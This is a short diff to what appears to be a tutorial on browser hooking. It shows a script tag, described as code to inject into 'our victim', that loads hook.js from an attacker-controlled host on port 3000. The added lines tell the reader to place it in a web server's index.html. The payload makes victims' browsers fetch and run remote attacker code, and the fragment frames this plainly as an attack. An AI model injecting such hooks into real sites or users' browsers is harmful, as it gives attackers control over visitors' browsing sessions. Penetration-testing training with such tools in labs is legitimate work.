@@ -36,3 +36,6 @@ The code we want to inject into our victim is:
 `<script src="http://<IP>:3000/hook.js"></script`,
 
 where `<IP>` is the IP of your host server containing *hook.js*.
+
+If you are using a HTTP server, make sure insert the code snippet above
+into */var/www/html/index.html*.
